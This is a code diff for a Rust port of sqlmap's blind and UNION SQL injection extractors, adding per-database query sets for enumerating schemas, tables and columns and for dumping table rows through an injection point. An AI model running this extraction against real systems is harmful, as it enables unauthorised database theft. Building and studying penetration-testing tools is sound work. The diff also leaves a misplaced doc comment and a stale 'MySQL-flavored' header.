@@ -1,7 +1,8 @@
 //! Blind (inference-based) data exfiltration.
 //!
 //! Port of sqlmap `lib/request/inference.py` (bisection over boolean `> N`
-//! conditions) plus the MySQL `information_schema` query set from
+//! conditions) plus the per-DBMS enumeration query sets from
+//! `queries.rs` (MySQL, PostgreSQL, MSSQL, Oracle).
 //! `data/xml/queries.xml` used by --dbs / --tables / --columns / --dump.
 //! Only the boolean-based blind channel is ported here; UNION exfiltration
 //! is separate. Queries are MySQL-flavored (matching the ported query set).
@@ -31,11 +32,20 @@ pub struct BlindExtractor<'a> {
     true_page: String,
     threshold: f64,
     seed: u64,
+    qs: crate::queries::Dbms,
     pub log: Vec<String>,
 }
 
 /// SQL hex string literal, avoiding quotes inside the injected fragment
 /// (sqlmap does the same to keep string boundaries intact).
+/// Choose the enumeration query set: the injection's DBMS hint (fingerprint
+/// or --dbms) wins; unknown tags fall back to MySQL with a log note, the
+/// historical behavior of this crate.
+fn pick_query_set(conf: &sqlmap_core::config::Config, inj: &sqlmap_core::injection::Injection) -> crate::queries::Dbms {
+    let tag = inj.dbms.as_deref().or(conf.dbms.as_deref()).unwrap_or("mysql");
+    crate::queries::Dbms::parse(tag).unwrap_or(crate::queries::Dbms::MySql)
+}
+
 fn hex(s: &str) -> String {
     let mut out = String::from("0x");
     for b in s.bytes() {
@@ -53,6 +63,7 @@ impl<'a> BlindExtractor<'a> {
         true_page: String,
         threshold: f64,
     ) -> Self {
+        let qs = pick_query_set(conf, &inj);
         Self {
             client,
             conf,
@@ -61,6 +72,7 @@ impl<'a> BlindExtractor<'a> {
             true_page,
             threshold,
             seed: 0,
+            qs,
             log: Vec::new(),
         }
     }
@@ -147,56 +159,37 @@ impl<'a> BlindExtractor<'a> {
     }
 
     fn list_schemata(&mut self) -> Option<Vec<String>> {
-        let n = self.infer_count("SELECT COUNT(schema_name) FROM information_schema.schemata")?;
+        let n = self.infer_count(&self.qs.schemata_count())?;
         let mut out = Vec::new();
         for i in 0..n {
-            out.push(self.infer_string(&format!(
-                "SELECT schema_name FROM information_schema.schemata LIMIT {i},1"
-            ))?);
+            out.push(self.infer_string(&self.qs.at(&self.qs.schemata_select(), i))?);
         }
         Some(out)
     }
 
     fn list_tables(&mut self, db: &str) -> Option<Vec<String>> {
-        let n = self.infer_count(&format!(
-            "SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema={}",
-            hex(db)
-        ))?;
+        let n = self.infer_count(&self.qs.tables_count(db))?;
         let mut out = Vec::new();
         for i in 0..n {
-            out.push(self.infer_string(&format!(
-                "SELECT table_name FROM information_schema.tables WHERE table_schema={} LIMIT {i},1",
-                hex(db)
-            ))?);
+            out.push(self.infer_string(&self.qs.at(&self.qs.tables_select(db), i))?);
         }
         Some(out)
     }
 
     fn list_columns(&mut self, db: &str, table: &str) -> Option<Vec<String>> {
-        let n = self.infer_count(&format!(
-            "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema={} AND table_name={}",
-            hex(db),
-            hex(table)
-        ))?;
+        let n = self.infer_count(&self.qs.columns_count(db, table))?;
         let mut out = Vec::new();
         for i in 0..n {
-            out.push(self.infer_string(&format!(
-                "SELECT column_name FROM information_schema.columns WHERE table_schema={} AND table_name={} LIMIT {i},1",
-                hex(db),
-                hex(table)
-            ))?);
+            out.push(self.infer_string(&self.qs.at(&self.qs.columns_select(db, table), i))?);
         }
         Some(out)
     }
 
     fn dump_table(&mut self, db: &str, table: &str, columns: &[String]) -> Option<TableDump> {
-        let n = self.infer_count(&format!("SELECT COUNT(*) FROM {db}.{table}"))?;
+        let n = self.infer_count(&self.qs.rows_count(db, table))?;
         let mut rows = Vec::new();
         for i in 0..n {
-            let row = self.infer_string(&format!(
-                "SELECT CONCAT_WS(0x3a,{}) FROM {db}.{table} LIMIT {i},1",
-                columns.join(",")
-            ))?;
+            let row = self.infer_string(&self.qs.at(&self.qs.row_select(db, table, columns), i))?;
             rows.push(row.split(':').map(|c| c.to_string()).collect::<Vec<_>>());
         }
         Some(TableDump {
@@ -295,6 +288,7 @@ pub struct UnionExtractor<'a> {
     inj: Injection,
     columns: u32,
     seed: u64,
+    qs: crate::queries::Dbms,
     pub log: Vec<String>,
 }
 
@@ -334,6 +328,7 @@ impl<'a> UnionExtractor<'a> {
         Some(Self {
             client,
             conf,
+            qs: pick_query_set(conf, &inj),
             param,
             inj,
             columns,
@@ -459,7 +454,7 @@ impl<'a> UnionExtractor<'a> {
             self.log.push("enumerating database names (UNION)".into());
             if let Some(v) = self.query_scalar(
                 echo,
-                "SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3a) FROM information_schema.schemata",
+                &self.qs.schemata_agg(),
             ) {
                 dbs = v.split(':').filter(|s| !s.is_empty()).map(String::from).collect();
                 self.log.push(format!("  databases: {}", dbs.join(", ")));
@@ -477,10 +472,7 @@ impl<'a> UnionExtractor<'a> {
             let scalars: Vec<String> = targets
                 .iter()
                 .map(|db| {
-                    format!(
-                        "SELECT GROUP_CONCAT(table_name SEPARATOR 0x3a) FROM information_schema.tables WHERE table_schema={}",
-                        hex(db)
-                    )
+                    self.qs.tables_agg(db)
                 })
                 .collect();
             for (db, v) in targets.iter().zip(self.query_scalars(echo, &scalars)) {
@@ -499,11 +491,7 @@ impl<'a> UnionExtractor<'a> {
                     let cols = self
                         .query_scalar(
                             echo,
-                            &format!(
-                                "SELECT GROUP_CONCAT(column_name SEPARATOR 0x3a) FROM information_schema.columns WHERE table_schema={} AND table_name={}",
-                                hex(&db),
-                                hex(&table)
-                            ),
+                            &self.qs.columns_agg(&db, &table),
                         )
                         .map(|v| v.split(':').filter(|s| !s.is_empty()).map(String::from).collect::<Vec<_>>())
                         .unwrap_or_default();
@@ -517,17 +505,12 @@ impl<'a> UnionExtractor<'a> {
                     }
                     if self.conf.dump {
                         let n = self
-                            .query_scalar(echo, &format!("SELECT COUNT(*) FROM {db}.{table}"))
+                            .query_scalar(echo, &self.qs.rows_count(&db, &table))
                             .and_then(|v| v.trim().parse::<u32>().ok())
                             .unwrap_or(0);
                         // Every row fetch is independent: batch them through the pool.
                         let scalars: Vec<String> = (0..n)
-                            .map(|i| {
-                                format!(
-                                    "SELECT CONCAT_WS(0x3a,{}) FROM {db}.{table} LIMIT {i},1",
-                                    cols.join(",")
-                                )
-                            })
+                            .map(|i| self.qs.at(&self.qs.row_select(&db, &table, &cols), i))
                             .collect();
                         let rows: Vec<Vec<String>> = self
                             .query_scalars(echo, &scalars)
